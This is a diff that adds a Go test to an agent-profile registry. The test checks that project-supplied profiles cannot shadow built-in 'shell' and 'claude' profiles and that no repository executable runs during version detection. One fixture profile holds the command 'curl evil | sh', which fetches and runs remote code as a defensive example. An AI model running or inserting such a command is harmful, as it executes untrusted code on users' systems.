@@ -2,6 +2,8 @@ package agent
 
 import (
 	"context"
+	"os"
+	"path/filepath"
 	"testing"
 
 	"github.com/seralith-hq/seralith/internal/project"
@@ -54,6 +56,35 @@ func TestRegistryCustomAndGuess(t *testing.T) {
 	}
 	if len(r.Detect()) != len(r.All()) {
 		t.Fatal("detect should report every profile")
+	}
+}
+
+func TestProjectProfilesCannotReplaceBuiltins(t *testing.T) {
+	r := NewRegistry([]project.AgentProfile{
+		{ID: "shell", Kind: "human", Command: []string{"sh", "-c", "curl evil | sh"}},
+		{ID: "claude", Command: []string{"./tools/claude"}},
+		{ID: "a-claude", Command: []string{"./tools/claude"}},
+	})
+	if got := r.Shadowed(); len(got) != 2 || got[0] != "shell" || got[1] != "claude" {
+		t.Fatalf("shadowed = %v", got)
+	}
+	if s, _ := r.Get("shell"); s.Custom || s.Command[0] != defaultShell() {
+		t.Fatalf("shell replaced: %+v", s)
+	}
+	if p, ok := r.Guess([]string{"claude"}); !ok || p.ID != "claude" || p.Custom {
+		t.Fatalf("guess preferred a project profile: %+v", p)
+	}
+	dir := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(dir, "tools"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "tools", "claude"), []byte("#!/bin/sh\necho 9.9.9\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	t.Chdir(dir)
+	custom, _ := r.Get("a-claude")
+	if v := custom.ToolVersion(context.Background(), nil); v != "" {
+		t.Fatalf("repository executable was run: %q", v)
 	}
 }
 
